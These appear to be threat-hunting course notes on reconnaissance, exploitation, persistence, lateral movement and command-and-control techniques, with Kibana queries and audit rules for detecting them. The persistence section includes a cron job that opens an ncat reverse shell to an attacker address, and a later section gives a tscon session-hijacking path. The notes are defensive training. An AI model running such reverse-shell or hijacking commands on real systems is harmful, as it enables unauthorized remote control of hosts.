Reconnaissance Overview
There are two types of reconnaissance adversaries may conduct as part of their attack campaigns: active and passive. Each type has its advantages and disadvantages for both adversaries and defenders, alike. 

﻿

Active Reconnaissance 
﻿

Active reconnaissance requires the adversary to be actively hands-on in the network, searching for any and all hosts, devices, and useful information. Active reconnaissance TTPs can be highly effective, but typically leave artifacts, or evidence, on the target network. Adversaries can employ tools such as Network Mapper (Nmap) or port scan to obtain Internet Protocol (IP) addresses and ports available on the network. However, a significant drawback to active reconnaissance is the amount of activity and noise it creates on the network. Analysts can identify and detect this type of activity by monitoring the network. Due to the evidence that remains after the activity, active reconnaissance is the only TTP that is detectable and can be hunted in a live environment. 

﻿

Passive Reconnaissance 
﻿

Adversaries use passive reconnaissance TTPs to discover network or host information that does not require sending communications to or through the network. Passive reconnaissance is much harder to detect than active reconnaissance. This is because passive reconnaissance lacks network-related communications or probes for defenders to track through network monitoring systems. 

﻿

Adversaries may use host-related commands that return cached communications or network sniffers as part of their passive techniques. Adversaries employing passive reconnaissance commonly conduct packet sniffing through tools such as Wireshark. A packet sniffer returns communication information from, to, and between networks. An adversary needs to have a foothold in a network to enable packet sniffing. To detect packet sniffing in a live environment, analysts review host logs collected by an Endpoint Detection and Response (EDR) solution. The logs contain connection details, such as IP addresses and bytes communicated, which allow analysts to identify anomalous and suspicious activity. Other passive reconnaissance techniques include using host-based tools that return cached information about the network, like the command arp, which returns the addresses of hosts that have been recently viewed and stored in a cache.

Reconnaissance TTPs
Adversaries have a wide variety of options to conduct both active and passive reconnaissance of a target network. Adversaries employ TTPS outlined and described in the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework when conducting reconnaissance to gather information about the target network. Common reconnaissance TTPs include the following, as presented in Figure 3.1-1, below:

﻿

﻿

Figure 3.1-1

﻿

Active Scanning
﻿

Adversaries conduct active scanning by searching the target network using the current traffic on it. This hands-on approach to reconnaissance typically involves sending communications to reachable hosts on the network. The hosts then return communications that provide information. The information returned typically pertains to IP addresses and other information that adversaries use to assess network design and infrastructure. 

﻿

Phishing for Information
﻿

Adversaries phish for information by sending malicious messages with the intent to obtain sensitive information. Phishing for information relies on an adversary’s ability to trick victims by posing as a legitimate persona or organization. An adversary then attempts to collect critical information such as usernames, passwords, names, addresses, or contact information. There is no bad information in the reconnaissance stage of a campaign. All information is considered useful. An example of phishing during active reconnaissance is Advanced Persistent Threat 28 (APT28). According to MITRE ATT&CK®, this threat group used phishing to obtain and exploit credentials. 

﻿

Searching Closed Sources
﻿

An adversary may obtain or purchase information through alternative, non-reputable sources or locations. The information they receive may be used in either ongoing or future campaigns. The information is typically collected from previous campaigns or data breaches that were conducted by other adversaries.

﻿

Searching Open Sources (Databases, Domains, Websites)
﻿

Adversaries may find the information they need through open sources. This includes open technical databases (T1596) as well as open websites and domains (T1593). Datastores pertaining to technical artifacts may provide information such as the registration of domains or previous network scans. Open and public websites, domains, or social media accounts may provide business-related information such as hiring needs or awarded contracts. 

Hunting for Reconnaissance
Hunting for adversary activity is significantly easier when analysts recognize the tools adversaries use on the network. Nmap is a primary tool for active reconnaissance. Nmap provides the features and capabilities necessary for adversaries to identify network components and design. Nmap also leaves evidence and artifacts of its activities for analysts to investigate during a hunt.

﻿

Nmap Overview
﻿

Nmap is a free and open-source utility for network discovery and security auditing. Nmap is a common tool used by the adversary to conduct reconnaissance activities. This utility provides users the capability to scan and derive information about devices on the network. Scanning with Nmap provides data about a device's Operating System (OS) and the ports being used. 

﻿

Hunting Overview
﻿

Hunting for active reconnaissance requires searching for artifacts left by Nmap in network connection logs such as host or Zeek logs. Once ingested into a SIEM, analysts can view and analyze the logs to identify anomalous connection patterns.

﻿

Host Logs﻿

﻿

Log files are collected on a variety of hosts and provide information for identifying active reconnaissance activity. Any log file that contains information regarding network connections and communications is useful in a hunt for active reconnaissance activity. Hosts that contain an EDR agent, host-based firewalls, or an Intrusion Detection System (IDS) agent provide the necessary logs for analysts to review. The log files collected on the hosts can be forwarded to a Security Information and Event Manager (SIEM), such as Elastic Stack or Splunk, for expanded visualization and analysis. Logs that collect processes provide analysts with details on both active and passive reconnaissance activity.

﻿

Zeek Connection Logs﻿

﻿

Hunting and detecting reconnaissance activity rely on ample and accurate network information aggregation. One tool that provides the necessary network information is Zeek, a free and open-source software network analysis framework. Zeek provides network data logs regarding network connections. These logs include a comprehensive record of every connection it catches on the wire. The data includes fields such as Hypertext Transfer Protocol (HTTP) sessions with their requested Uniform Resource Identifier (URIs) and Domain Name Service (DNS) requests with replies.

﻿

SIEM﻿

﻿

A SIEM such as Elastic Stack or Splunk provides the necessary data housing and visualization platforms for Zeek logs. Defense analysts hunt reconnaissance activity by using a SIEM to manipulate and analyze the Zeek logs. One component of Nmap that is quickly searchable in a SIEM is the number of ports associated with a given IP address. Nmap scans the top 1000 ports by default and creates a data table that displays source IP address, destination IP address, and number of destination ports. A visualization based on the number of ports scanned reveals the instances where Nmap was used. This lesson demonstrates this detection method in a later section.

Which statement describes the reconnaissance technique of phishing for information?
Send malicious messages with the intent to obtain sensitive information.

Which statement describes the reconnaissance technique of active scanning?
﻿
Exploitation TTP Overview
The most common exploitation TTPs are privilege escalation, Local Code Execution (LCE), and Remote Code Execution (RCE). Understanding how these exploits work is key to detecting their presence and defending against them.

﻿

Privilege Escalation
﻿

Privilege escalation is when adversaries circumvent user account privileges to perform actions on systems with higher-level permissions. Systems typically limit privileges to control the operations a user can perform on a machine. However, different vulnerability exploits create workarounds and new ways to execute system instruction at a higher privilege level. Windows attracts common exploits such as access token manipulation. This exploit occurs when the active Windows session token is manipulated to perform tasks, often at the administrative level. Dynamic Link Library (DLL) hijacking is another example in which a trusted system DLL is manipulated to execute code. Since the DLL is associated with an application that runs at the system level, the permissions of the malicious code also run with system permissions. There are many more privilege escalation exploitation techniques, but these examples provide a starting point when looking for potential compromise. An example of a real-world privilege escalation exploit is the Colonial Pipeline Breach.

﻿

LCE and RCE
﻿

Unintentional code bugs are the root cause of many application vulnerabilities. These bugs pave the way for an adversary to take advantage of program behavior that extends beyond the program’s capabilities. A code execution vulnerability in a program also usually creates a privilege escalation path for adversaries as well. This is because most code execution exploits are able to take advantage of the user account that is running the malicious program. For example, a vulnerability may allow an adversary to manipulate a spreadsheet program into installing another application, such as ransomware or a cryptocurrency miner. Additionally, if an exploit manages to execute code during a process used by the Windows System account, the code runs with full system user privileges. Code execution vulnerabilities are some of the most common and desirable exploitation methods because of the vast utility they offer to an adversary. An example of an infamous remote code execution exploit is Log4Shell.

This filter displays abnormal requests. Although there are not many requests, there is an unusual detail in the destination ports that is worth a closer look. The top count is in the dynamic Remote Procedure Call (RPC) range. This may imply that the system requesting data from the server was repeatedly requesting much more of the same kind of information. Corroborating the DNS query data and the dynamic port data with raw logs on a host possibly points to more specific activity that details the information the potentially malicious source requested.


After identifying hosts as potential subjects of exploitation, analysts pursuing more thorough investigations of those hosts may uncover points of the initial breach, as well as indicators and methods of compromise. This information helps build a clearer picture of an adversary's attack chain.

source.ip:172.16.4.5 AND curl

Persistence Overview
Persistence refers to the installation of an implant, backdoor, or access method that is able to restart or reinstall upon deactivation. The most common example of persistence is the ability of malicious code to survive and restart after a device reboots. Threat actors often configure persistence mechanisms on compromised devices in order to maintain a foothold in a network so they can return for future operations. If a compromised device is stable and rarely reboots, such as in the case of network devices, adversaries may opt out of configuring a persistence mechanism and leave only their malicious code running in memory. Malicious code that only exists in memory is much harder to detect by defenders but also cannot survive a reboot. To maintain persistence, artifacts must be saved on the system, which restarts the malicious code. Understanding persistence and knowing the common methods can help defenders detect and prevent threats from infecting their client environments.

﻿

Trainees learn commonly used persistence methods used on Windows and Linux, log sources required to catch persistence activity, and how to detect persistence activity using Security Onion. Example queries are based on Kibana Query Language (KQL) for searching within Elastic Stack.

Windows Persistence
Threat actors use numerous methods to maintain persistence on a Windows host. Common methods used by attackers are Autorun locations, Background Intelligent Transfer Service (BITS) jobs, services, and scheduled tasks. It is critical to have proper logging configured before the attack occurs to detect these persistence methods. If logs are not being sent from the host to an off-device logging solution, an adversary can easily cover their tracks by wiping the logs on the localhost. However, if the logs have been exported to an aggregated logging solution, the task of covering up tracks becomes much more difficult.

﻿

Registry Run Keys
﻿

Registry run keys are one of the oldest persistence methods in Windows. To detect this method, it is required to log Sysmon Event ID 13: Registry value set. This event provides valuable information such as the user who created the key, the process that created the key, the target registry object, and the value. Detecting run key persistence requires searching for events where event.code is 13 and winlog.event_data.TargetObject contains parts of different run keys. A list of run keys can be found on the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) Registry Run Keys/Startup Folder page found in the Additional Resources.

﻿

The MITRE ATT&CK Framework is a valuable resource to explore for a list of registry locations to hunt for persistence. Another valuable resource, which provides a repository of rules, is Sigma. Sigma is a generic signature format for Security Information and Event Management (SIEM) systems. All the rules in the repository are freely available for anyone to use.

﻿

Scheduled Tasks
﻿

There are several methods to detect persistence via scheduled tasks. Enabling Microsoft-Windows-TaskScheduler/Operational within the Windows Event logging service provides the following six Event Identifiers (ID) specifically geared toward monitoring scheduled tasks:

Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered

Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated

Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted

Event ID 4698 on Windows 10, Server 2016 - Scheduled task created

Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled

Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

Sysmon Event ID 1: Process create is another valuable event to detect persistence via scheduled tasks. Searching for events with an event.code of 1 and a process.pe.original_file_name of schtasks.exe provides the full command run to create the task as well as a host of other fields.

﻿

Windows BITS Jobs
﻿

BITS is a Windows feature that is often used for updaters and messengers. BITS jobs can be created and managed via the bitsadmin tool in the command line or the eight BitsTransfer cmdlets in PowerShell. The BITSAdmin Command-Line Interface (CLI) is deprecated but still works if it is installed on a system.

﻿

PowerShell script block logging (Event ID 4104: Execute a Remote Command), BITS Client logging (Event ID 3: New Job Created), and Sysmon Process Create logging (Event ID 1: Process Create) are several options to detect suspicious BITS activity. Searching for events with an event.code of 1, a process.command_line line that contains Transfer, Create, AddFile, SetNotifyCmdLine, SetMinRetryDelay, or Resume, and a process.pe.original_file_name of bitsadmin.exe returns BITSAdmin activity that can be analyzed for suspicious activity.

﻿

Services
﻿

Persistence via a service is another common method adversaries use. Detecting a potentially malicious service requires Windows System logs (Event ID 4697: A service was installed on the system or 7045: A new service was installed on the system) or Sysmon logs (Event ID 1: Process Create or 13: Registry Value Set). Existing service paths being modified, new services being spawned with non-typical paths, and suspicious execution of programs through services are all red flags to look for. When suspicious activity is found, it is always important to expand the search around the suspicious activity in an attempt to track it back to the threat actor’s initial entry point.

﻿

Valid features in the Operating System (OS) are often employed to obtain persistence. It is important for a defender to understand their environment to identify between normal and abnormal behaviors. Baselining an environment helps prevent false positives and enables actionable investigation outcomes.

Linux Persistence
Much like Windows, there are also many different methods for a threat actor to maintain persistence on a Linux host. Common persistence methods include cron jobs, account creation, and logon scripts. Gain an understanding of the required logging and strategies to detect persistence on Linux hosts. 

﻿

Cron Jobs
﻿

Cron jobs are the primary method used to create a persistent scheduled task in Linux. Adversaries use this Linux feature to configure persistence. There are many ways cron is used for persistence. For example, a cron job is created to run on reboot, which creates a netcat session. The session creates a reverse shell to the adversary’s box, which is listening for the connection. Below is an example of such a cron job:

@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash
﻿

To detect this type of activity, Linux Audit Daemon (Auditd) rules need to be in place to audit when changes are made to the system's cron tables. Below are examples of auditd rules from Florian Roth's Auditd configuration available on GitHub:

-w /etc/cron.allow -p wa -k cron
-w /etc/cron.deny -p wa -k cron
-w /etc/cron.d/ -p wa -k cron
-w /etc/cron.daily/ -p wa -k cron
-w /etc/cron.hourly/ -p wa -k cron
-w /etc/cron.monthly/ -p wa -k cron
-w /etc/cron.weekly/ -p wa -k cron
-w /etc/crontab -p wa -k cron
-w /var/spool/cron/ -k cron
The rule syntax follows the standard, which was pulled from the audit.rules man page:

-w path-to-file -p permissions -k keyname
﻿

The permissions include one of the following:

r: Read the file.
w: Write to the file.
x: Execute the file.
a: Change the file's attribute.
The default Auditbeat configuration parses the keyname from these audit rules to the tag field. This makes hunting using specific audit rules much more convenient. Check the audit rule keyname to hunt on and start hunting using a search similar to the following:

tag: cron
﻿

The downside to hunting for persistence via cron using logging is that the logs do not show the actual cron job. The only time persistence is logged is when one of the cron files is altered. This means that determining if a change to the cron jobs was malicious requires access to the endpoint to check the list of cron jobs using the following command:

crontab -l
﻿

Several events trigger when crontab is used to view cron jobs with -l or -e. However, when a change is made to a cron file, there are events with an event.action of renamed and changed-file-ownership-of. These events are important to audit. If a modification to cron jobs is detected on a host, the cron file that was modified should be reviewed for suspicious cron jobs.

﻿

Account Creation
﻿

Creating an account is another way a threat actor obtains persistence on a Linux system. Using the Elastic standard Auditbeat configuration captures the required data to detect this method of persistence. However, if a custom configuration is in use, it needs to have the system module’s user dataset enabled to monitor useradd activity.

﻿

To ensure accounts are not being created for persistence, events with an event.action of user_added and a system.audit.user.group.name of root should be audited. Root users should only be created when absolutely necessary so as to not create an excess of noise. However, this varies depending on the specific network being hunted on.

﻿

UNIX Shell Configuration Modification
﻿

Modifying profile configuration files in Linux is a common way threat actors gain persistence. It is as easy as echoing a malicious shell script into /etc/profile, /etc/.bashrc, or /etc/bash_profile (or other system or user shell configuration files) to call home to set up a reverse shell upon spawning of a new interactive or non-interactive shell. Using the file integrity module in Auditbeat allows for tracking changes to these profiles. An event with an event.action of updated or attributes_modified and a file.path of one of the profile paths (i.e., /etc/profile) indicates that the profile was modified. If this is observed, reviewing the profile modified on the host for changes is ideal, but if the host is unable to be accessed, expanding the search to view events surrounding the modification may reveal the threat actor’s command that made the change.

﻿

Network Flow
﻿

In addition to detecting persistence directly by looking for changes to files and commands being run, checking for beaconing activity can also provide valuable information. Auditbeat's system module provides events with an event.action of network_flow, which are useful for detecting suspicious beaconing activity using the search result chart in Kibana.

﻿

These are just a few examples of persistence methods threat actors use. To be a successful defender, continuous learning is a must. Keeping up to speed with MITRE ATT&CK helps stay current on methods used and how to properly hunt for the activity.

﻿Detecting Persistence Explained
During the unassisted hunt for persistence, seven persistence methods were located in the logs. Explanations and detection of the following methods are revealed below:

Registry Run Keys

Scheduled Tasks

BITS Jobs

Services

Cron Jobs

Account Creation

UNIX Profile Configuration Modification

Registry Run Keys
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 created the object HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\duck with the value of C:\duck.exe. Suspicion is raised any time an executable is located in the root of the C:\ directory.

﻿

Query
agent.type: winlogbeat AND event.module: sysmon AND ((event.code: 13 AND winlog.event_data.TargetObject: "*CurrentVersion\Run*") OR (event.code: 1 AND process.pe.original_file_name: reg.exe AND process.command_line: "*CurrentVersion\Run*"))
﻿

False Positives
﻿

The user eng_user01 created a run key for OneDrive and, at first glance, it may look suspicious because the OneDrive.exe file it is pointing to is located in C:\Users\eng_user01\AppData\Local\Microsoft\OneDrive\OneDrive.exe. Normally, legitimate programs are installed in the Program Files folders, but AppData is often used because it does not require administrator privileges to install programs there.

﻿

Scheduled Tasks
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 created a scheduled task to execute C:\Users\Administrator\AppData\Local\duck.exe on login. While programs are sometimes installed to AppData locations, they are in a parent folder for the specific program and not dropped in the root of the Local or Roaming folders.

﻿

Query
agent.type: winlogbeat AND event.dataset: process_creation AND event.module: sysmon AND event.code: 1 AND process.pe.original_file_name: schtasks.exe
﻿

False Positives
﻿

There was one event where the schtasks command was run with no flags.

﻿

BITS Jobs
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 used bitsadmin.exe to configure a BITSAdmin job that executed goose.exe that reaches out to the attacker’s machine in an attempt to open a backdoor. 

﻿

Query
agent.type: winlogbeat AND event.dataset: process_creation AND process.pe.original_file_name: "bitsadmin.exe" AND process.command_line: ("*Transfer*" OR "*Create*" OR "*AddFile*" OR "*SetNotifyCmdLine*" OR "*SetMinRetryDelay*" OR "*Resume*")
﻿

False Positives
﻿

No false positives appeared.

﻿

Services
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 attempted to start the suspicious service C:\Program Files\go.exe.

﻿

Query
﻿

The following query is used in Kibana's Lens application to take a quick glance at what services were created during the allotted hunt time range:

agent.type: winlogbeat AND event.dataset: system AND event.code: 7045
﻿

Enter the following queries into the Lens:

event.code.keyword
winlog.event_data.ImagePath
﻿

These reveal the suspicious service C:\Program Files\go.exe. Now that the name and path of the service are known, event.code 1 and 13 can be utilized to gather more information.

﻿

False Positives
﻿

No false positives appeared.

﻿

Cron Jobs
﻿

Description
﻿

Several cron jobs were created by the users JCTE and root on the host cups-server. These actions need further investigation by gaining direct access to the cups-server host or by using a tool like OSquery to query the cron jobs on the host. 

﻿

Query
agent.type: auditbeat AND event.module: auditd AND tags: cron AND event.action: ("renamed" OR "changed-file-ownership-of")
﻿

False Positives
﻿

No false positives appeared.

﻿

Account Creation
﻿

Description
﻿

A new user, larry, was created on the cups-server and was provided root privileges. This action requires validation to ensure it was approved activity. It can also be used as a jumping-off point for a deeper investigation to see if the user larry performed any suspicious activity after creation.

﻿

Query
agent.type: auditbeat AND event.module: system AND event.dataset: user AND event.action: user_added
﻿
False Positives
﻿
No false positives appeared.

UNIX Profile Configuration Modification

Description
﻿
The user root modified /etc/profile on the cups-server host. This action requires validation to ensure it was approved activity.﻿

Query
agent.type: auditbeat AND event.dataset: file AND event.action: (updated OR attributes_modified) AND file.path: "/etc/profile"
﻿
False Positives

No false positives appeared.

Windows
Registry run keys
Scheduled tasks
BITS jobs
Services

Linux
Cron jobs
Account creation
UNIX profile configuration modification

Lateral Movement Overview
Lateral movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and gain access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain a foothold in an environment. Adversaries might install Remote Access Tools (RAT) to accomplish lateral movement or use legitimate credentials with native network and Operating System (OS) tools, which are often more stealthy.

﻿

Lateral movement occurs when adversaries use various techniques to move within a network. Often, lateral movement requires multiple techniques chained together in order to reach the intended destination. Once inside the network, an adversary exploits remote services such as Secure Shell (SSH), Windows Remote Management (WinRM), Windows Management Instrumentation (WMI), and other SMB-based utilities that allow direct connection to the systems within a network.

﻿

There are usually several goals with lateral movement outside of infecting other computers within a network. Adversaries also target other systems within a network for persistence in order to have a continued presence on the network or use them for Command-and-Control (C2) purposes. These systems often have the data exfiltrated.

﻿

Systems that have long uptimes or that may be out of date and have direct access to the internet, are often prime targets for adversaries. Any system that is connected to the internet that has little usage is also a prime target, as an infection is less likely to be discovered.

Lateral Movement TTPs
There are many different techniques that can be used for lateral movement, which is why it is very hard to detect threats moving throughout the network. Lateral movement is often used to enter and control remote systems on a network. In order to achieve their primary objectives, adversaries often explore the network in order to find their target and gain access to it. This often involves pivoting through multiple systems or accounts.  

﻿

The following techniques are all from the MITRE ATT&CK framework. They are some of the most popular lateral movement techniques that adversaries are known to use.

Exploitation of Remote Services (T1210)
Adversaries are known to exploit remote services to gain access to internal systems, once they are inside a network. Adversaries can exploit software vulnerabilities within a program or the OS to execute code. The goal is to enable access to a remote system.

  

Adversaries first need to determine if the remote system is vulnerable. This is done through discovery methods such as network service scanning to obtain a list of services running on the target to find one that may be vulnerable. This includes methods such as port scans and vulnerability scans. It typically uses tools that the adversary brings onto the system. Services that are commonly exploited are SMB, Remote Desktop Protocol (RDP), and applications that use internal networks such as MySQL (Structured Query Language).

﻿

Detecting software exploitation is difficult because some of the vulnerabilities may cause certain processes or applications to become unstable or crash. Look for abnormal behavior of processes such as suspicious files written to a disk or unusual network traffic. If application logs are accessible, this is a good place to look for evidence of lateral movement.

Remote Services (T1021)
Adversaries that have already compromised and acquired valid user accounts and logins use them to access services specifically designed for remote connections such as SSH, Virtual Network Computing (VNC), and WinRM. If an adversary is able to obtain a set of valid domain credentials for an environment, they can essentially log in to any machine in the environment using remote services such as RDP or SSH.

﻿

If an adversary wishes to exfiltrate data as part of the lateral movement, they can use SMB to remotely connect to a network share. Windows also has hidden network shares that are only accessible to administrators to allow for remote file copy and other administrative functions. Some examples of these network shares include C$, ADMIN$, and IPC$. Adversaries use this technique in conjunction with an administrator-level account to remote access a network over SMB and transfer files or run transferred binaries through remote execution.

﻿

Adversaries take advantage of remote systems using WinRM, which is a Windows service and protocol that allows a user to interact with a remote system. This service can be called with the winrm command using a program such as PowerShell. WinRM can be used to remotely interact with other systems on a network and move laterally throughout an environment. When using WinRM remotely through PowerShell, the child process wsmprovhost.exe is spawned, which indicates an adversary is using remote code execution to laterally move within a network.

﻿

Adversaries take advantage of Windows administration tools, like PSExec, that are used for remotely managing hosts. PSExec is a lightweight standalone utility that allows interactive access to the programs it runs remotely. If an adversary has already obtained compromised credentials and has access to an environment, it can use PSExec to execute commands on another host. PSExec activity involves remote service creation events, which generate Windows Event Identifiers (ID) 7045. When PSExec is used, it spawns a PSEXEVC service, which should also be monitored.

﻿

When discovering or hunting for remote services lateral movement, correlate the use of login activity with remote services executed. Monitor user accounts logged into systems that they normally do not access or accounts that do not normally use remote services. Look for Windows Event ID 4624 pertaining to new user login sessions and Event ID 4648 for an attempted login. In addition, Windows Event IDs 5140 and 5145 relate to opening network shares. Monitor remote login events and any users connected to administrative shares for suspicious activity. 

﻿

In addition, monitor network traffic such as Zeek connection logs and Sysmon Event ID 3 logs. For lateral movement techniques such as using WinRM, the service attempts to connect via port 5985 or 5986. Suspicious traffic often exploits ports such as port 22 for SSH or port 3389 for RDP.

Remote Service Session Hijacking (T1563)
Pre-existing sessions with remote services are often exploited to move laterally in an environment. Users log into a service designed to accept remote connections such as SSH or RDP and establish a session that allows them to maintain continuous access to the remote system. Adversaries take control of these sessions to further their attacks using remote systems. This differs from the Exploitation of Remote Services because adversaries are hijacking an existing session rather than creating a new one using valid accounts. 

﻿

Adversaries hijack a legitimate user's active SSH session by taking advantage of the trust relationships established with other systems via public key authentication. This happens when the SSH agent is compromised or access to the agent's socket is obtained.    

  

Adversaries also hijack legitimate remote desktop sessions to laterally move throughout a network. Typically, a user is notified when someone is trying to take over their RDP session. With System permissions, and using this path for the Terminal Services Console c:\windows\system32\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or alerting the user. 

﻿

Detecting lateral movement within remote session hijacking is difficult because often the sessions are legitimate. Adversaries do not start a new session like some of the other techniques; they take over an existing one. Often the activity that occurs after a remote login attempt indicates suspicious activity. Monitor for user accounts that are logged into systems not normally accessed or multiple systems that are accessed within a short period of time.

Taint Shared Content (T1080)
Threat actors deliver malicious payloads to remote systems by adding content to shared locations such as network drives or shared code repositories. This content can be corrupted by adversaries when they add malicious programs, scripts, or code to files that are otherwise normal. Once a user opens the file, the malicious content placed by an adversary is triggered, which can cause lateral movement within a network. 

    

For example, malicious code is embedded into a shared Excel spreadsheet. When the infected file is shared within an organization, each machine that opens it becomes infected. This allows adversaries to hunt on each machine for their target data or account to accomplish their desired goals. Both binary and non-binary formats ending with the file extensions .exe, .dll, .bat, and .vbs are targeted.

﻿

Shared content that is tainted is often very difficult to detect. Any processes that write or overwrite many files to a network share are suspicious. Monitor processes that are executed from removable media and for malicious file types that do not typically exist in a shared directory.

se Alternate Authentication Material (T1550)
If an adversary is unable to acquire valid credentials, they may use alternate authentication methods such as password hashes, kerberos tickets, or application access tokens to move laterally within an environment. Authentication processes require valid usernames and one or more authentication factors such as a password or Personal Identification Number (PIN). These methods generate legitimate alternate authentication material. This material is cached, which allows the system to validate the identity has been successfully verified without asking the user to reenter the authentication factors. The alternate material is maintained by the system, either in the memory or on the disk. Adversaries steal this alternate material through credential access techniques in order to bypass access controls without valid credentials.  

﻿

When local commands are run that are meant to be executed on a remote system, like scheduling remote tasks, the local system passes its token to the remote system. If the currently active user has administrative credentials, they can execute the commands remotely.

﻿

Adversaries also use the Pass-the-Hash (PtH) attacks to steal password hashes in order to move laterally. PtH is a method of authenticating as a user without having access to the user's cleartext password. When performing this technique, valid password hashes are captured using various credential access techniques. Captured hashes are used to authenticate as that user. This allows adversaries to move laterally through an environment. 

﻿

Detecting this lateral movement technique includes monitoring Windows Event IDs 4768 and 4769, which are generated when a user requests a new Ticket-Granting Ticket (TGT) or service ticket. All login and credential use events should also be audited and reviewed. Unusual remote logins, along with other suspicious activity, indicate something malicious is happening. New Technology Local Area Network (LAN) Manager (NTLM) Logon Type 3 authentications that are not associated with a domain logon are also suspicious.

Lateral Movement Tools
Adversaries often use tools that are integrated into the OS to move laterally through the network and deliver malicious payloads.  

PsExec: PsExec is a utility that is part of the Sysinternals suite. It is a command-line administration tool that administrators can use to remotely execute processes and manage systems. 
SCP (Secure Copy): The Unix-like Command-Line Interface (CLI) is used to transfer files between systems. This can be used to move malicious files across the network.
Remote Session Tools (SSH, WinRM, SMB, RDP, WMI): The remote session protocols for Unix-like and Windows OSs. Threat actors may attempt to hijack a session or use compromised valid credentials in order to use these tools to move laterally across the network.
Task Scheduler: A Windows tool used to achieve persistence and continuously execute malicious payloads.
cron: A Linux tool, similar to Task Scheduler, that allows administrators to automate scheduled tasks at a set time. Used to achieve persistence and deliver malicious payloads.

Command and Control Overview
What is Command and Control?
﻿

Each outbound beacon is an opportunity for defenders to detect malicious actors. These beacons provide the C2 protocol for the attackers. This means every exploit payload has some form of C2. The ubiquitous nature of C2 techniques means that being able to detect C2 behavior is critical to reduce the time an aggressor is able to maintain access within a network. This section details common C2 TTPs and defense evasion tactics.

﻿

Getting Around Firewalls
﻿

Many movies featuring hackers present network infiltration as the inevitable output of a few hours of rapid keyboard typing. However, the biggest idea these movies get wrong about cyber is firewalls. Threat actors are unlikely to gain direct access to a machine through the internet if a network firewall is blocking inbound traffic to the target workstation. However, there are other ways threat actors gain access to these machines that allow them to freely move around networks with firewalls.

﻿

Although a properly-configured network firewall blocks inbound traffic to host machines, these firewalls rarely block outgoing traffic to the internet. An organization may employ a network policy that only allows the web ports (80 and 443) outbound, but this does not stop hackers from being able to successfully control a system on the other side. This is possible with beaconing malware, which is a malicious agent on the victim's system that connects outbound to the attacker to provide command and control.

﻿

C2 TTPs
﻿

Attackers have to get over obstacles to successfully exploit systems. Table 3.5-1, below, presents the C2 TTPs that are common for attackers to use because they overcome the defenses that are commonly in place.

﻿

﻿

Table 3.5-1﻿

﻿

Application Layer Protocols (T1071)
﻿

The most common way malware communicates out of a network is through application layer protocols. In this technique, the attacker sets up a seemingly normal web server or File Transfer Protocol (FTP) server, then uses that network connection to control the endpoint. This activity is tricky to view on the network because it naturally blends in with legitimate application traffic.

﻿

Communication Through Removable Media (T1092)
﻿

Communicating through removable media allows attackers to transfer commands to hosts on networks without internet access. In 2008, the malware known as Agent.BTZ was used in a massive cyberattack against the United States (US) military. Agent.BTZ was able to gain access to both classified and unclassified networks. This malware was able to execute using the file autorun.inf, a technique that MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) describes in T1091. Removable media was being swapped back and forth between networks with and without internet access, so the attackers were able to perform C2 and data exfiltration actions.

﻿

Web Service (T1102)
﻿

An attacker may implement a C2 protocol using popular web services to communicate with malware. If an attacker is using a shopping website, for example, the malware simply needs to connect to a predefined product on that site and just read the comments. The attacker can then add in a seemingly benign comment such as, "This broke after 1 use, very bad, do not recommend." This comment signals the malware to behave in a certain way (T1102.003). Some malware may also make comments back on the same page as part of a bidirectional communication tactic (T1102.002).

﻿

A real-world example of this technique was discovered in 2017 with malware that is suspected to be Russian state-sponsored. The malware searches for specific commands in the comments on Britney Spears' Instagram page. The algorithm in the malware decodes the comments into C2 server domains. A regular expression matches certain letters in the comments and those letters become a shortened Uniform Resource Locator (URL) link that resolves to the actual C2 server.

﻿

Detecting this technique at the network layer is difficult because it requires more contextual information, such as the normal working hours for employees. A sudden increase in traffic to one Instagram profile should register as odd to defenders analyzing the network layer. At the host layer, detection options include viewing web requests from unknown binaries.

﻿

Traffic Signaling (T1205)
﻿

Systems connected directly to the internet are scanned often. The traffic signaling TTP works by delivering encoded commands as logs that seemingly come from random internet traffic. Port knocking (T1205.001) is a great example of this. As an example, the "magic" command may be two consecutive failed attempts on three predefined ports. The logs in this example would present data as follows:

Connection refused port 90 March 11 2022 12:25:14 PM

Connection refused port 90 March 11 2022 12:25:15 PM

Connection refused port 70 March 11 2022 12:25:16 PM

Connection refused port 70 March 11 2022 12:25:17 PM

Connection refused port 60 March 11 2022 12:25:18 PM

Connection refused port 60 March 11 2022 12:25:19 PM

﻿

This signals the malware to perform a predefined action. The actions may be creating a connection back to the system performing the knocking, opening up a port to connect inbound, or even deleting everything on the system.

﻿

C2 Defense Evasion Tactics
﻿

The ways around defensive signatures are numerous and limited only by the attacker's imagination. However, once defenders understand the C2 protocol, they can block it. Blocking may require expensive technology, but it is always possible. Part of understanding C2 protocols is recognizing that all of these evasion techniques have the goal of hiding suspicious traffic. Popular ways for attackers to evade defensive measures include Encryption (T1573) and Dynamic Resolution (T1568).

﻿

Encryption (T1573)
﻿

Encryption was created to improve security. This may seem ironic, considering that it can also be used to provide safe, secure communications for nefarious activities. Any off-the-shelf encryption algorithms provide what most hackers need. These algorithms can be either symmetric or asymmetric. Symmetric encryption is fast and secure, but does not help much with preventing unauthorized access. Asymmetric encryption allows software to be deployed without someone removing the key and issuing their own commands. The more unusual the communication protocol, the more obvious the encryption traffic is going to be. 

﻿

Secure software typically starts with asymmetric encryption, then passes keys to continue the conversation with symmetric encryption algorithms because symmetric encryption is considerably faster to compute. While it is possible for hackers to do everything with asymmetric keys, it is considered bizarre because of the extreme amounts of computational power required for asymmetric encryption. 

